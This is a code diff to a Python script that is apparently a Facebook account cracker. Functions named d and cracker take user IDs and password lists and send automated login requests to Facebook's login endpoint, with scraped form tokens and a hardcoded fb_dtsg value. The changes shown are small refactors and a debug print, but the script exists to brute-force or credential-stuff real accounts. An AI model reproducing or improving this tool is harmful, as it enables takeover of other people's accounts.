@@ -1766,7 +1766,7 @@ def d(uid,pwx,tl):
         "client_input_params": {
             "machine_id": "",
             "contact_point": uid,
-            "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            "password": "#PWD_BROWSER:0:{}:{}".format(str(int(time.time())), pw),
             "accounts_list": [],
             "fb_ig_device_id": [],
             "secure_family_device_id": "",
@@ -1793,7 +1793,6 @@ def d(uid,pwx,tl):
         }
     })
 }
-            parama = json.dumps(data)
             data2 = {
             '__aaid': '0',
             '__user': '0',
@@ -1810,7 +1809,7 @@ def d(uid,pwx,tl):
             'fb_dtsg': 'NAcOlfpCOM2BFnghClV_Fbk2SejAMCvE1gYRFgP4Eh4s03fmjrbDwEA:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'params': parama,}
+            'params': json.dumps(data),}
             params = {
             'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
             'type': 'action',
@@ -1872,7 +1871,7 @@ def d(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        #print({error})
+        print({error})
         pass
 
 def cracker(uid, pwx, tl):
